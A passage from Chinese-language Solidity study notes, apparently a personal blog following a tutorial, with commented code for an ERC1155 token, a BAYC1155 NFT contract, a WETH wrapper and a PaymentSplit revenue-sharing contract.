实现IERC1155的balanceOf，返回account地址的id种类代币持仓量。<br>     */<br>    function balanceOf(address account, uint256 id) public view virtual override returns (uint256) &#123;<br>        require(account != address(0), &quot;ERC1155: address zero is not a valid owner&quot;);<br>        return _balances[id][account];<br><br>    &#125;<br><br>    /**<br>     * @dev 批量持仓查询<br>     * 要求:<br>     * - `accounts` 和 `ids` 数组长度相等.<br>     */<br>    function balanceOfBatch(address[] memory accounts, uint256[] memory ids)<br>    public view virtual override<br>    returns (uint256[] memory)<br>    &#123;<br>        require(accounts.length == ids.length, &quot;ERC1155: accounts and ids length mismatch&quot;);<br>        uint256[] memory batchBalances = new uint256[](accounts.length);<br>        for (uint256 i = 0; i &lt; accounts.length; ++i) &#123;<br>            batchBalances[i] = balanceOf(accounts[i], ids[i]);<br>        &#125;<br>        return batchBalances;<br>    &#125;<br><br>    /**<br>     * @dev 批量授权，调用者授权operator使用其所有代币<br>     * 释放&#123;ApprovalForAll&#125;事件<br>     * 条件：msg.sender != operator<br>     */<br>    function setApprovalForAll(address operator, bool approved) public virtual override &#123;<br>        require(msg.sender != operator, &quot;ERC1155: setting approval status for self&quot;);<br>        _operatorApprovals[msg.sender][operator] = approved;<br>        emit ApprovalForAll(msg.sender, operator, approved);<br>    &#125;<br><br>    /**<br>     * @dev 查询批量授权.<br>     */<br>    function isApprovedForAll(address account, address operator) public view virtual override returns (bool) &#123;<br>        return _operatorApprovals[account][operator];<br>    &#125;<br><br>    /**<br>     * @dev 安全转账，将`amount`单位的`id`种类代币从`from`转账到`to`<br>     * 释放 &#123;TransferSingle&#125; 事件.<br>     * 要求:<br>     * - to 不能是0地址.<br>     * - from拥有足够的持仓量，且调用者拥有授权<br>     * - 如果 to 是智能合约, 他必须支持 IERC1155Receiver-onERC1155Received.<br>     */<br>    function safeTransferFrom(<br>        address from,<br>        address to,<br>        uint256 id,<br>        uint256 amount,<br>        bytes memory data<br>    ) public virtual override &#123;<br>        address operator = msg.sender;<br>        // 调用者是持有者或是被授权<br>        require(<br>            from == operator || isApprovedForAll(from, operator),<br>            &quot;ERC1155: caller is not token owner nor approved&quot;<br>        );<br>        require(to != address(0), &quot;ERC1155: transfer to the zero address&quot;);<br>        // from地址有足够持仓<br>        uint256 fromBalance = _balances[id][from];<br>        require(fromBalance &gt;= amount, &quot;ERC1155: insufficient balance for transfer&quot;);<br>        // 更新持仓量<br>        unchecked &#123;<br>            _balances[id][from] = fromBalance - amount;<br>        &#125;<br>        _balances[id][to] += amount;<br>        // 释放事件<br>        emit TransferSingle(operator, from, to, id, amount);<br>        // 安全检查<br>        _doSafeTransferAcceptanceCheck(operator, from, to, id, amount, data);<br>    &#125;<br><br>    /**<br>     * @dev 批量安全转账，将`amounts`数组单位的`ids`数组种类代币从`from`转账到`to`<br>     * 释放 &#123;TransferSingle&#125; 事件.<br>     * 要求:<br>     * - to 不能是0地址.<br>     * - from拥有足够的持仓量，且调用者拥有授权<br>     * - 如果 to 是智能合约, 他必须支持 IERC1155Receiver-onERC1155BatchReceived.<br>     * - ids和amounts数组长度相等<br>     */<br>    function safeBatchTransferFrom(<br>        address from,<br>        address to,<br>        uint256[] memory ids,<br>        uint256[] memory amounts,<br>        bytes memory data<br>    ) public virtual override &#123;<br>        address operator = msg.sender;<br>        // 调用者是持有者或是被授权<br>        require(<br>            from == operator || isApprovedForAll(from, operator),<br>            &quot;ERC1155: caller is not token owner nor approved&quot;<br>        );<br>        require(ids.length == amounts.length, &quot;ERC1155: ids and amounts length mismatch&quot;);<br>        require(to != address(0), &quot;ERC1155: transfer to the zero address&quot;);<br><br>        // 通过for循环更新持仓<br>        for (uint256 i = 0; i &lt; ids.length; ++i) &#123;<br>            uint256 id = ids[i];<br>            uint256 amount = amounts[i];<br><br>            uint256 fromBalance = _balances[id][from];<br>            require(fromBalance &gt;= amount, &quot;ERC1155: insufficient balance for transfer&quot;);<br>            unchecked &#123;<br>                _balances[id][from] = fromBalance - amount;<br>            &#125;<br>            _balances[id][to] += amount;<br>        &#125;<br><br>        emit TransferBatch(operator, from, to, ids, amounts);<br>        // 安全检查<br>        _doSafeBatchTransferAcceptanceCheck(operator, from, to, ids, amounts, data);<br>    &#125;<br><br>    /**<br>     * @dev 铸造<br>     * 释放 &#123;TransferSingle&#125; 事件.<br>     */<br>    function _mint(<br>        address to,<br>        uint256 id,<br>        uint256 amount,<br>        bytes memory data<br>    ) internal virtual &#123;<br>        require(to != address(0), &quot;ERC1155: mint to the zero address&quot;);<br><br><br>        address operator = msg.sender;<br><br>        _balances[id][to] += amount;<br>        emit TransferSingle(operator, address(0), to, id, amount);<br><br>        _doSafeTransferAcceptanceCheck(operator, address(0), to, id, amount, data);<br>    &#125;<br><br>    /**<br>     * @dev 批量铸造<br>     * 释放 &#123;TransferBatch&#125; 事件.<br>     */<br>    function _mintBatch(<br>        address to,<br>        uint256[] memory ids,<br>        uint256[] memory amounts,<br>        bytes memory data<br>    ) internal virtual &#123;<br>        require(to != address(0), &quot;ERC1155: mint to the zero address&quot;);<br>        require(ids.length == amounts.length, &quot;ERC1155: ids and amounts length mismatch&quot;);<br><br>        address operator = msg.sender;<br><br>        for (uint256 i = 0; i &lt; ids.length; i++) &#123;<br>            _balances[ids[i]][to] += amounts[i];<br>        &#125;<br><br>        emit TransferBatch(operator, address(0), to, ids, amounts);<br><br>        _doSafeBatchTransferAcceptanceCheck(operator, address(0), to, ids, amounts, data);<br>    &#125;<br><br>    /**<br>     * @dev 销毁<br>     */<br>    function _burn(<br>        address from,<br>        uint256 id,<br>        uint256 amount<br>    ) internal virtual &#123;<br>        require(from != address(0), &quot;ERC1155: burn from the zero address&quot;);<br><br>        address operator = msg.sender;<br><br>        uint256 fromBalance = _balances[id][from];<br>        require(fromBalance &gt;= amount, &quot;ERC1155: burn amount exceeds balance&quot;);<br>        unchecked &#123;<br>            _balances[id][from] = fromBalance - amount;<br>        &#125;<br><br>        emit TransferSingle(operator, from, address(0), id, amount);<br>    &#125;<br><br>    /**<br>     * @dev 批量销毁<br>     */<br>    function _burnBatch(<br>        address from,<br>        uint256[] memory ids,<br>        uint256[] memory amounts<br>    ) internal virtual &#123;<br>        require(from != address(0), &quot;ERC1155: burn from the zero address&quot;);<br>        require(ids.length == amounts.length, &quot;ERC1155: ids and amounts length mismatch&quot;);<br><br>        address operator = msg.sender;<br><br>        for (uint256 i = 0; i &lt; ids.length; i++) &#123;<br>            uint256 id = ids[i];<br>            uint256 amount = amounts[i];<br><br>            uint256 fromBalance = _balances[id][from];<br>            require(fromBalance &gt;= amount, &quot;ERC1155: burn amount exceeds balance&quot;);<br>            unchecked &#123;<br>                _balances[id][from] = fromBalance - amount;<br>            &#125;<br>        &#125;<br><br>        emit TransferBatch(operator, from, address(0), ids, amounts);<br>    &#125;<br><br>    // @dev ERC1155的安全转账检查<br>    function _doSafeTransferAcceptanceCheck(<br>        address operator,<br>        address from,<br>        address to,<br>        uint256 id,<br>        uint256 amount,<br>        bytes memory data<br>    ) private &#123;<br>        // Member cannot be resolved<br>    if (to.isContract()) &#123;<br>            try IERC1155Receiver(to).onERC1155Received(operator, from, id, amount, data) returns (bytes4 response) &#123;<br>                if (response != IERC1155Receiver.onERC1155Received.selector) &#123;<br>                    revert(&quot;ERC1155: ERC1155Receiver rejected tokens&quot;);<br>                &#125;<br>            &#125; catch Error(string memory reason) &#123;<br>                revert(reason);<br>            &#125; catch &#123;<br>                revert(&quot;ERC1155: transfer to non-ERC1155Receiver implementer&quot;);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    // @dev ERC1155的批量安全转账检查<br>    function _doSafeBatchTransferAcceptanceCheck(<br>        address operator,<br>        address from,<br>        address to,<br>        uint256[] memory ids,<br>        uint256[] memory amounts,<br>        bytes memory data<br>    ) private &#123;<br>        if (to.isContract()) &#123;<br>            try IERC1155Receiver(to).onERC1155BatchReceived(operator, from, ids, amounts, data) returns (<br>                bytes4 response<br>            ) &#123;<br>                if (response != IERC1155Receiver.onERC1155BatchReceived.selector) &#123;<br>                    revert(&quot;ERC1155: ERC1155Receiver rejected tokens&quot;);<br>                &#125;<br>            &#125; catch Error(string memory reason) &#123;<br>                revert(reason);<br>            &#125; catch &#123;<br>                revert(&quot;ERC1155: transfer to non-ERC1155Receiver implementer&quot;);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    /**<br>     * @dev 返回ERC1155的id种类代币的uri，存储metadata，类似ERC721的tokenURI.<br>     */<br>    function uri(uint256 id) public view virtual override returns (string memory) &#123;<br>        string memory baseURI = _baseURI();<br>        return bytes(baseURI).length &gt; 0 ? string(abi.encodePacked(baseURI, id.toString())) : &quot;&quot;;<br>    &#125;<br><br>    /**<br>     * 计算&#123;uri&#125;的BaseURI，uri就是把baseURI和tokenId拼接在一起，需要开发重写.<br>     */<br>    function _baseURI() internal view virtual returns (string memory) &#123;<br>        return &quot;&quot;;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="NFT合约"><a href="#NFT合约" class="headerlink" title="NFT合约"></a>NFT合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>// by 0xAA<br>pragma solidity ^0.8.21;<br><br>import &quot;./40_ERC1155.sol&quot;;<br><br>contract BAYC1155 is ERC1155&#123;<br>    uint256 constant MAX_ID = 10000;<br>    // 构造函数<br>    constructor() ERC1155(&quot;BAYC1155&quot;, &quot;BAYC1155&quot;)&#123;<br>    &#125;<br><br>    //BAYC的baseURI为ipfs://QmeSjSinHpPnmXmspMjwiXyN6zS4E9zccariGR3jxcaWtq/<br>    function _baseURI() internal pure override returns (string memory) &#123;<br>        return &quot;ipfs://QmPMc4tcBsMqLRuCQtPmPe84bpSjrC3Ky7t3JWuHXYB4aS/&quot;;<br>    &#125;<br><br>    // 铸造函数<br>    function mint(address to, uint256 id, uint256 amount) external &#123;<br>        // id 不能超过10,000<br>        require(id &lt; MAX_ID, &quot;id overflow&quot;);<br>        _mint(to, id, amount, &quot;&quot;);<br>    &#125;<br><br>    // 批量铸造函数<br>    function mintBatch(address to, uint256[] memory ids, uint256[] memory amounts) external &#123;<br>        // id 不能超过10,000<br>        for (uint256 i = 0; i &lt; ids.length; i++) &#123;<br>            require(ids[i] &lt; MAX_ID, &quot;id overflow&quot;);<br>        &#125;<br>        _mintBatch(to, ids, amounts, &quot;&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="41-WETH"><a href="#41-WETH" class="headerlink" title="41. WETH"></a>41. WETH</h1><p>WETH就是ETH的ERC20代币，1:1 兑换的</p><p><code>WETH</code> (Wrapped ETH)是<code>ETH</code>的带包装版本。我们常见的<code>WETH</code>，<code>WBTC</code>，<code>WBNB</code>，都是带包装的原生代币。那么我们为什么要包装它们？</p><p>在2015年，<a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/20_SendETH/readme.md">ERC20</a>标准出现，该代币标准旨在为以太坊上的代币制定一套标准化的规则，从而简化了新代币的发布，并使区块链上的所有代币相互可比。不幸的是，以太币本身并不符合<code>ERC20</code>标准。<code>WETH</code>的开发是为了提高区块链之间的互操作性 ，并使<code>ETH</code>可用于去中心化应用程序（dApps）。它就像是给原生代币穿了一件智能合约做的衣服：穿上衣服的时候，就变成了<code>WETH</code>，符合<code>ERC20</code>同质化代币标准，可以跨链，可以用于<code>dApp</code>；脱下衣服，它可1:1兑换<code>ETH</code>。</p><h2 id="WETH合约"><a href="#WETH合约" class="headerlink" title="WETH合约"></a><code>WETH</code>合约</h2><p>目前在用的<a href="https://rinkeby.etherscan.io/token/0xc778417e063141139fce010982780140aa0cd5ab?a=0xe16c1623c1aa7d919cd2241d8b36d9e79c1be2a2">主网WETH合约</a>写于2015年，非常老，那时候solidity是0.4版本。我们用0.8版本重新写一个<code>WETH</code>。</p><p><code>WETH</code>符合<code>ERC20</code>标准，它比普通的<code>ERC20</code>多了两个功能：</p><ol><li>存款：包装，用户将<code>ETH</code>存入<code>WETH</code>合约，并获得等量的<code>WETH</code>。</li><li>取款：拆包装，用户销毁<code>WETH</code>，并获得等量的<code>ETH</code></li></ol><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p><code>WETH</code>符合<code>ERC20</code>代币标准，因此<code>WETH</code>合约继承了<code>ERC20</code>合约。</p><h3 id="事件-1"><a href="#事件-1" class="headerlink" title="事件"></a>事件</h3><p><code>WETH</code>合约共有<code>2</code>个事件：</p><ol><li><code>Deposit</code>：存款事件，在存款的时候释放。</li><li><code>Withdraw</code>：取款事件，在取款的时候释放。</li></ol><h3 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h3><p>除了<code>ERC20</code>标准的函数外，<code>WETH</code>合约有<code>5</code>个函数：</p><ul><li>构造函数：初始化<code>WETH</code>的名字和代号。</li><li>回调函数：<code>fallback()</code>和<code>receive()</code>，当用户往<code>WETH</code>合约转<code>ETH</code>的时候，会自动触发<code>deposit()</code>存款函数，获得等量的<code>WETH</code>。</li><li><code>deposit()</code>：存款函数，当用户存入<code>ETH</code>时，给他铸造等量的<code>WETH</code>。</li><li><code>withdraw()</code>：取款函数，让用户销毁<code>WETH</code>，并归还等量的<code>ETH</code>。</li></ul><h3 id="代码1"><a href="#代码1" class="headerlink" title="代码1"></a>代码1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: UNLICENSED<br>pragma solidity ^0.8.21;<br>// author: 0xAA<br>// original contract on ETH: https://rinkeby.etherscan.io/token/0xc778417e063141139fce010982780140aa0cd5ab?a=0xe16c1623c1aa7d919cd2241d8b36d9e79c1be2a2#code<br>import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;<br>contract  WETH is ERC20&#123;<br>    // 事件，存款和取款<br>    event Deposit(address indexed dst ,uint wad);<br>    event Withdrawal(address indexed src ,uint wad);<br>    // 构造函数，初始化ERC20 的名字和代号<br>    constructor()ERC20(&quot;WETH&quot;,&quot;WETH&quot;)&#123;<br><br>    &#125;<br>    // 回调函数，当用户往WETH合约转入ETH时，会触发此函数运行deposit()函数<br>    fallback()external payable&#123;<br>        deposit();<br>    &#125;<br>    // 回调函数，当用户往用户往WETH合约转入ETH时，会触发此函数运行deposit()函数<br>    receive()external payable&#123;<br>        deposit();<br>    &#125;<br>    // 充值函数，当用户存入ETH时，给他铸造等量的WETH<br>    function deposit() public payable &#123;<br>        _mint(msg.sender,msg.value);<br>        emit Deposit(msg.sender,msg.value);<br>    &#125;<br>    // 取款函数，用户销毁WETH，取回等量的ETH,这个函数不需要转账ETH所以不是payable<br>    function withdraw(uint amount)public  &#123;<br>        require(balanceOf(msg.sender)&gt;=amount);<br>        _burn(msg.sender,amount);<br>        payable(msg.sender).transfer(amount);// 支付给sender对应数量的WETH<br>        emit Withdrawal(msg.sender,amount);//触发事件<br>    &#125;<br>    // 由于继承了@openzeppelin/contracts/token/ERC20/ERC20.sol的ERC20合约，自带有_mint和_burn方法因此不需要学<br>//    function _mint()  &#123;<br>//<br>//    &#125; ^ DeclarationError: Libraries cannot have receive ether functions.<br>//    function _burn()  &#123;<br>//<br>//    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="42-分账"><a href="#42-分账" class="headerlink" title="42. 分账"></a>42. 分账</h1><h2 id="分账"><a href="#分账" class="headerlink" title="分账"></a>分账</h2><p>分账就是按照一定比例分钱财。在现实中，经常会有“分赃不均”的事情发生；而在区块链的世界里，<code>Code is Law</code>，我们可以事先把每个人应分的比例写在智能合约中，获得收入后，再由智能合约来进行分账。</p><h2 id="分账合约"><a href="#分账合约" class="headerlink" title="分账合约"></a>分账合约</h2><p>分账合约(<code>PaymentSplit</code>)具有以下几个特点：</p><ol><li>在创建合约时定好分账受益人<code>payees</code>和每人的份额<code>shares</code>。</li><li>份额可以是相等，也可以是其他任意比例。</li><li>在该合约收到的所有<code>ETH</code>中，每个受益人将能够提取与其分配的份额成比例的金额。</li><li>分账合约遵循<code>Pull Payment</code>模式，付款不会自动转入账户，而是保存在此合约中。受益人通过调用<code>release()</code>函数触发实际转账。</li></ol><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs d"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span><br><span class="hljs-keyword">pragma</span> solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.21</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 分账合约 </span><br><span class="hljs-comment"> * @dev 这个合约会把收到的ETH按事先定好的份额分给几个账户。收到ETH会存在分账合约中，需要每个受益人调用release()函数来领取。</span><br><span class="hljs-comment"> */</span><br>contract PaymentSplit&#123;<br></code></pre></td></tr></table></figure><h3 id="事件-2"><a href="#事件-2" class="headerlink" title="事件"></a>事件</h3><p>分账合约中共有<code>3</code>个事件：</p><ul><li><code>PayeeAdded</code>：增加受益人事件。</li><li><code>PaymentReleased</code>：受益人提款事件。</li><li><code>PaymentReceived</code>：分账合约收款事件。</li></ul><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-comment">// 事件</span><br><span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">PayeeAdded</span>(<span class="hljs-params">address account, uint256 shares</span>)</span>; <span class="hljs-comment">// 增加受益人事件</span><br><span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">PaymentReleased</span>(<span class="hljs-params">address to, uint256 amount</span>)</span>; <span class="hljs-comment">// 受益人提款事件</span><br><span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">PaymentReceived</span>(<span class="hljs-params">address <span class="hljs-keyword">from</span>, uint256 amount</span>)</span>; <span class="hljs-comment">// 合约收款事件</span><br></code></pre></td></tr></table></figure><h3 id="状态变量-3"><a href="#状态变量-3" class="headerlink" title="状态变量"></a>状态变量</h3><p>分账合约中共有<code>5</code>个状态变量，用来记录受益地址、份额、支付出去的<code>ETH</code>等变量：</p><ul><li><code>totalShares</code>：总份额，为<code>shares</code>的和。</li><li><code>totalReleased</code>：从分账合约向受益人支付出去的<code>ETH</code>，为<code>released</code>的和。</li><li><code>payees</code>：<code>address</code>数组，记录受益人地址</li><li><code>shares</code>：<code>address</code>到<code>uint256</code>的映射，记录每个受益人的份额。</li><li><code>released</code>：<code>address</code>到<code>uint256</code>的映射，记录分账合约支付给每个受益人的金额。</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">uint</span>256 <span class="hljs-keyword">public</span> totalShares; <span class="hljs-comment">// 总份额</span><br><span class="hljs-built_in">uint</span>256 <span class="hljs-keyword">public</span> totalReleased; <span class="hljs-comment">// 总支付</span><br><br>mapping(address =&gt; <span class="hljs-built_in">uint</span>256) <span class="hljs-keyword">public</span> shares; <span class="hljs-comment">// 每个受益人的份额</span><br>mapping(address =&gt; <span class="hljs-built_in">uint</span>256) <span class="hljs-keyword">public</span> released; <span class="hljs-comment">// 支付给每个受益人的金额</span><br>address[] <span class="hljs-keyword">public</span> payees; <span class="hljs-comment">// 受益人数组</span><br></code></pre></td></tr></table></figure><h3 id="函数-2"><a href="#函数-2" class="headerlink" title="函数"></a>函数</h3><p>分账合约中共有<code>6</code>个函数：</p><ul><li>构造函数：始化受益人数组<code>_payees</code>和分账份额数组<code>_shares</code>，其中数组长度不能为0，两个数组长度要相等。_shares中元素要大于0，_payees中地址不能为0地址且不能有重复地址。</li><li><code>receive()</code>：回调函数，在分账合约收到<code>ETH</code>时释放<code>PaymentReceived</code>事件。</li><li><code>release()</code>：分账函数，为有效受益人地址<code>_account</code>分配相应的<code>ETH</code>。任何人都可以触发这个函数，但<code>ETH</code>会转给受益人地址<code>account</code>。调用了releasable()函数。</li><li><code>releasable()</code>：计算一个受益人地址应领取的<code>ETH</code>。调用了<code>pendingPayment()</code>函数。</li><li><code>pendingPayment()</code>：根据受益人地址<code>_account</code>, 分账合约总收入<code>_totalReceived</code>和该地址已领取的钱<code>_alreadyReleased</code>，计算该受益人现在应分的<code>ETH</code>。</li><li><code>_addPayee()</code>：新增受益人函数及其份额函数。在合约初始化的时候被调用，之后不能修改。</li></ul><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.21;<br><br><br>/**<br> * 分账合约<br> * @dev 这个合约会把收到的ETH按事先定好的份额分给几个账户。收到ETH会存在分账合约中，需要每个受益人调用release()函数来领取。<br> */<br>// 所以就是，收钱，然后做百分比，然后领钱<br>contract PaymentSplit&#123;<br>    // 3个事件<br>    //PayeeAdded：增加受益人事件。<br>    event PayeeAdded(address account, uint256 shares);// 增加受益人事件<br>    //PaymentReleased：受益人提款事件。<br>    event Release(address to,uint256 amount); // 受益人领钱<br>    //PaymentReceived：分账合约收款事件。<br>    event PaymentReceived(address from,uint256 amount); // 合约收钱啦<br>    uint256 public totalShares; // 总份额<br>    uint256 public totalReleased; // 总支付<br><br>    mapping(address =&gt; uint256) public shares; // 每个受益人的份额<br>    mapping(address =&gt; uint256) public released; // 支付给每个受益人的金额--已经分过的<br>    address[] public payees; // 受益人数组<br>    /**<br> * @dev 初始化受益人数组_payees和分账份额数组_shares<br>     * 数组长度不能为0，两个数组长度要相等。_shares中元素要大于0，_payees中地址不能为0地址且不能有重复地址<br>     */<br>    constructor(<br>        address[] memory _payees,// 分钱的人数组<br>        uint256[] memory _shares//对应的份额比例<br>    )payable&#123;//payable表示要付钱<br>        // 检查_payees和_shares数组长度相同，且不为0<br>        require(_payees.length==_shares.length,&quot;PaymentSplitter: payees and shares length mismatch&quot;);<br>        require(_payees.length!=0,&quot;PaymentSplitter: no payees&quot;);<br>        for(uint256 i=0;i&lt;_payees.length;i++)&#123;<br>            _addPayee(_payees[i], _shares[i]);// 增加收益人，这个下划线一看就是只有内部可以调用<br>        &#125;<br><br>    &#125;<br>    /**<br>       * @dev 回调函数，收到ETH释放PaymentReceived事件<br>     */<br>    receive()external payable virtual&#123;<br>        // 广播出去告诉大家我们收到钱啦，由谁转的，转了多少钱<br>        emit PaymentReceived(msg.sender,msg.value);<br>    &#125;<br>    /**<br>    * @dev 为有效受益人地址_account分帐，相应的ETH直接发送到受益人地址。任何人都可以触发这个函数，但钱会打给account地址。<br>     * 调用了releasable()函数。<br>     */<br>    function release(address payable _account)public virtual  &#123;<br>        // account 必须是收益人<br>        require(shares[_account]&gt;0,&quot;PaymentSplitter: account has no shares&quot;);<br>        // 计算account应得的eth<br>        uint256 payment =releasable(_account);// 应付的钱<br>        // 校验应得的钱不能小于0<br>        require(payment!=0,&quot;PaymentSplitter: account is not due payment&quot;);<br>        // 更新总支付totalReleased和支付给每个受益人的金额released<br>        totalReleased+=payment;// 总已付<br>        released[_account]+=payment;// 该用户总已领取<br>        // 开始转钱<br>        _account.transfer(payment);// 给这个地址转对应的钱<br>        emit Release(_account,payment);<br>    &#125;<br><br><br>    /**<br>    * @dev 计算一个账户能够领取的eth。<br>     * 调用了pendingPayment()函数。<br>     */<br>    function releasable(address _account) public view returns(uint256) &#123;<br>        // 计算分账合约总收入totalReceived<br>        uint256 totalReleased=address(this).balance+totalReleased; // 等于这个地址当前的余额+加上总支付的钱=合约总收入<br>        return pendingPayment(_account,totalReleased,released[_account]);<br>    &#125;<br>    /**<br>    * @dev 根据受益人地址`_account`, 分账合约总收入`_totalReceived`和该地址已领取的钱`_alreadyReleased`，计算该受益人现在应分的`ETH`。<br>     */<br>    function pendingPayment(<br>        address _account,// 用户地址？<br>        uint256 _totalReceived,//总收入<br>        uint256 _alreadyReleased//已分账<br>    ) public view returns(uint256) &#123;<br>        return(_totalReceived*shares[_account])/totalShares-_alreadyReleased;// 等于总收入乘以对应地址的份额处以当前总份额减去已经分过的<br>    &#125;<br>    /**<br>    * @dev 新增受益人_account以及对应的份额_accountShares。只能在构造器中被调用，不能修改。<br>     */<br>    function _addPayee(address _account,uint256 _accountShares)private  &#123;<br>        // 检查地址不为空<br>        require(_account!=address(0),&quot;PaymentSplitter: account is the zero address&quot;);<br>        // 检查份额不为0<br>        require(_accountShares&gt;0, &quot;PaymentSplitter: shares are 0&quot;);<br>        // 检查_account 不能重复<br>        require(shares[_account]==0,&quot;PaymentSplitter: account already has shares&quot;);<br>        // 更新 payees,shares 和 totalShares;<br>        payees.push(_account);<br>        shares[_account]=_accountShares;// map赋值<br>        totalShares+=_accountShares;<br>        // 释放事件告诉大家<br>        emit PayeeAdded(_account,_accountShares);<br><br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>08-4Solidity笔记之四ABI编码函数选择器</title>
    <link href="/2025/05/07/08-4Solidity%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%9B%9B/"/>
    <url>/2025/05/07/08-4Solidity%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%9B%9B/</url>
    
